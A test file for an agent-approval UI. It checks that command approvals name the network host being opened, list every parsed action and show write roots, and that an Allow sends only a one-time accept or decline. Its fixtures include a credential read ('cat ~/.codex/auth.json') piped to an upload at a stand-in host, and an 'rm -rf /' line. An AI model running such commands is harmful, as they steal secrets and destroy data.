// A NETWORK APPROVAL NAMES THE HOST SHE IS OPENING, ON THE CARD.
//
// `codexApprovalCard` drew a command approval as `{ tool: 'Bash', input:
// { command, cwd, description } }` and threw the rest of the request away. Two
// of the things it threw away change what her Allow MEANS:
//
//   networkApprovalContext  the host and protocol the sandbox would be opened
//                           to. The schema's own words: "Optional context for a
//                           managed-network approval prompt."
//   commandActions          the server's own best-effort parse of the command,
//                           several entries, of which exactly the FIRST was
//                           read and the rest dropped.
//
// MEASURED, from the CLI's own schema dump on this Mac 2026-09-05 -- `codex
// app-server generate-json-schema --out <dir>`, codex-cli 0.148.0,
// CommandExecutionRequestApprovalParams:
//
//   command                       string | null      "The command to be executed."
//   commandActions                CommandAction[] | null
//                                 "Best-effort parsed command actions for
//                                  friendly display." Every variant carries its
//                                  own `command` string.
//   networkApprovalContext        { host: string,
//                                   protocol: "http"|"https"|"socks5Tcp"|"socks5Udp" }
//                                 | null
//   proposedNetworkPolicyAmendments  { action: "allow"|"deny", host }[] | null
//   proposedExecpolicyAmendment      string[] | null
//   cwd, reason, itemId, threadId, turnId, startedAtMs, approvalId, environmentId
//
// So there are two failures, opposite in direction and both real.
//
// SHE COULD APPROVE A COMMAND WITHOUT SEEING THE NETWORK IT OPENS. `command`
// and `networkApprovalContext` arrive together and only the first was drawn, so
// the card said `curl ...` and said nothing about the host the sandbox was
// being opened to.
//
// AND A REQUEST WITH NO COMMAND STRING WAS DENIED EVEN WHERE THE HOST WAS THERE
// TO SHOW. `command` is nullable; the old code looked at the first parsed
// action and then refused.
//
// THE SAME SHAPE ON A PATCH. FileChangeRequestApprovalParams carries
// `grantRoot`: "[UNSTABLE] When set, the agent is asking the user to allow
// writes under this root for the remainder of the session". The card drew the
// diff and not the root, so an Allow on one visible patch could be read as
// opening a whole tree for the rest of the run.
//
// WHAT HER ALLOW STILL DOES NOT DO, pinned below because it is the reason none
// of this needs a second button: the transport only ever sends `accept` or
// `decline`. `acceptWithExecpolicyAmendment` and `applyNetworkPolicyAmendment`
// are decisions in the same enum that write a PERSISTENT rule for a host or a
// command shape, and Agentbox sends neither -- so one Allow is one request, and
// the proposed amendments on the params are read for display and never acted on.

import { describe, it, expect, afterAll } from 'vitest';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { codexApprovalCard, createCodexApprovals } from '../main/codex-approvals.mjs';
import { approvalReads } from '../renderer/src/approval-card.ts';
import { NAME } from '../shared/product-name.mjs';

const NET = 'item/commandExecution/requestApproval';
const FILE = 'item/fileChange/requestApproval';
const base = { itemId: 'call_1', threadId: 'T', turnId: 'U', startedAtMs: 1 };

const roots = [];
afterAll(() => {
  for (const root of roots) { try { rmSync(root, { recursive: true, force: true }); } catch { /* best effort */ } }
});

/* ======================= a command that opens a host ===================== */

describe('a command approval that also carries a network grant', () => {
  it('names the host beside the command', () => {
    const card = codexApprovalCard(NET, {
      ...base,
      command: 'curl -sS https://api.example.com/v1/keys',
      networkApprovalContext: { host: 'api.example.com', protocol: 'https' },
    });
    expect(card.input.command).toBe('curl -sS https://api.example.com/v1/keys');
    expect(card.input.host).toBe('api.example.com over https');
  });

  // THE PROTOCOL IS ONE OF FOUR WORDS AND NOTHING ELSE IS PRINTED AS ONE. A
  // release that adds a fifth must not put an unvouched-for word under a
  // question about her machine; the host is still the fact, so the host is
  // still said.
  it.each([['https'], ['http'], ['socks5Tcp'], ['socks5Udp']])('says the %s protocol Codex named', (protocol) => {
    const card = codexApprovalCard(NET, { ...base, command: 'curl x', networkApprovalContext: { host: 'h.example', protocol } });
    expect(card.input.host).toBe(`h.example over ${protocol}`);
  });

  it('says the host alone when the protocol is a word this version does not know', () => {
    const card = codexApprovalCard(NET, { ...base, command: 'curl x', networkApprovalContext: { host: 'h.example', protocol: 'quic' } });
    expect(card.input.host).toBe('h.example');
  });

  // THE CASE THAT MUST NOT MATCH. An ordinary local command carries no context
  // and must not grow a host line, empty or otherwise: a card that says
  // "undefined" under a question about her machine is worse than one that says
  // nothing, which is the rule `cwd` is already drawn by.
  it.each([
    ['no context at all', {}],
    ['a null context', { networkApprovalContext: null }],
    ['a context with no host', { networkApprovalContext: { protocol: 'https' } }],
    ['a context whose host is blank', { networkApprovalContext: { host: '   ', protocol: 'https' } }],
    ['a context that is not an object', { networkApprovalContext: 'api.example.com' }],
  ])('draws no host line for %s', (_what, extra) => {
    const card = codexApprovalCard(NET, { ...base, command: 'ls', ...extra });
    expect(card.input).not.toHaveProperty('host');
  });
});

/* =================== a request with no command string ==================== */

describe('a command approval with no command string', () => {
  it('is carded on the host when there is one, rather than refused', () => {
    const card = codexApprovalCard(NET, {
      ...base,
      command: null,
      networkApprovalContext: { host: 'drive.google.com', protocol: 'https' },
    });
    expect(card).not.toBeNull();
    expect(card.input.host).toBe('drive.google.com over https');
    expect(card.input).not.toHaveProperty('command');
  });

  // THE BOUNDARY ON THE OTHER SIDE, unchanged: nothing describable is still a
  // refusal, and that is the line that must not move.
  it('is still refused when there is no command and no host either', () => {
    expect(codexApprovalCard(NET, { ...base, command: null })).toBeNull();
    expect(codexApprovalCard(NET, { ...base, command: '   ', commandActions: [] })).toBeNull();
  });

  // And the card reads as what it is. `approvalReads` is the only copy of the
  // card's wording, and "asks to run" over a card with no command in it is the
  // card lying about the question.
  it('reads as reaching a host, not as running something', () => {
    const card = codexApprovalCard(NET, { ...base, command: null, networkApprovalContext: { host: 'drive.google.com', protocol: 'https' } });
    expect(approvalReads(card.input)).toEqual({ what: 'asks to reach', body: 'drive.google.com over https' });
  });

  it('still reads as running when there is a command, host or no host', () => {
    const card = codexApprovalCard(NET, { ...base, command: 'curl x', networkApprovalContext: { host: 'h.example', protocol: 'https' } });
    expect(approvalReads(card.input).what).toBe('asks to run');
    expect(approvalReads(card.input).body).toBe('curl x');
  });
});

/* ====================== every parsed action, not the first ================ */

describe('a command approval described only by its parsed actions', () => {
  it('shows every one of them, not just the first', () => {
    const card = codexApprovalCard(NET, {
      ...base,
      command: null,
      commandActions: [
        { type: 'read', name: 'auth.json', path: '/Users/her/.codex/auth.json', command: 'cat ~/.codex/auth.json' },
        { type: 'unknown', command: 'curl -T - https://elsewhere.example' },
      ],
    });
    expect(card.input.command).toBe('cat ~/.codex/auth.json\ncurl -T - https://elsewhere.example');
  });

  // The blanks between them are dropped rather than drawn as empty lines, so
  // one unparseable action does not push the rest off the card.
  it('leaves out the actions that carry no command string', () => {
    const card = codexApprovalCard(NET, {
      ...base,
      command: null,
      commandActions: [{ type: 'unknown', command: '' }, { type: 'unknown', command: 'rm -rf /' }, { type: 'unknown' }],
    });
    expect(card.input.command).toBe('rm -rf /');
  });

  // THE CASE THAT MUST NOT MATCH: a real `command` is still the thing she is
  // answering about. The actions are the server's own guess at it, and showing
  // the guess over the fact would be a card about the wrong string.
  it('prefers the command Codex actually sent', () => {
    const card = codexApprovalCard(NET, {
      ...base,
      command: 'bash -lc "cat a && cat b"',
      commandActions: [{ type: 'read', name: 'a', path: '/a', command: 'cat a' }],
    });
    expect(card.input.command).toBe('bash -lc "cat a && cat b"');
  });
});

/* =========================== a patch that opens a tree =================== */

describe('a file-change approval that asks for a write root', () => {
  const item = { type: 'fileChange', id: 'call_1', changes: [{ path: '/w/a.txt', kind: { add: {} }, diff: 'hello\n' }] };
  const seen = () => {
    const map = new Map();
    map.set('call_1', { tool: 'Write', input: { changes: 'Write /w/a.txt\nhello' } });
    return map;
  };

  it('names the root the run would be allowed to write in', () => {
    const card = codexApprovalCard(FILE, { ...base, grantRoot: '/Users/her/Zero' }, seen(item));
    expect(card.input.grantRoot).toBe('/Users/her/Zero');
    expect(card.input.changes).toContain('Write /w/a.txt');
  });

  // The ordinary patch, which is nearly all of them, is unchanged.
  it.each([['null', null], ['absent', undefined], ['blank', '  ']])('draws no root line when grantRoot is %s', (_what, grantRoot) => {
    const card = codexApprovalCard(FILE, { ...base, grantRoot }, seen(item));
    expect(card.input).not.toHaveProperty('grantRoot');
  });
});

/* ================ and what an Allow still cannot be turned into ========== */

describe(`the words ${NAME} is willing to answer an approval with`, () => {
  // A card in front of her is one request. `acceptWithExecpolicyAmendment` and
  // `applyNetworkPolicyAmendment` are the two decisions in Codex's own enum
  // that write a PERSISTENT rule -- a host allowed for good, a command shape
  // never asked about again -- and a yes she gave to one command must never
  // become one of those.
  it.each([[true, 'accept'], [false, 'decline']])(
    'answers %s with exactly "%s", whatever amendments the request proposed',
    async (allow, word) => {
      const root = mkdtempSync(join(tmpdir(), 'codex-net-'));
      roots.push(root);
      let n = 0;
      const cards = createCodexApprovals({ storeRoot: root, uuid: () => `card-${n += 1}` });
      const scope = cards.scope({ product: 'agentbox', item: 'w-1' });
      const answered = scope.handle(NET, {
        ...base,
        command: 'curl -sS https://api.example.com',
        networkApprovalContext: { host: 'api.example.com', protocol: 'https' },
        // The two offers whose acceptance would be permanent.
        proposedNetworkPolicyAmendments: [{ action: 'allow', host: 'api.example.com' }],
        proposedExecpolicyAmendment: ['curl'],
      });
      expect(cards.settle('card-1', allow, null)).toBe(true);
      await expect(answered).resolves.toBe(word);
    },
  );
});
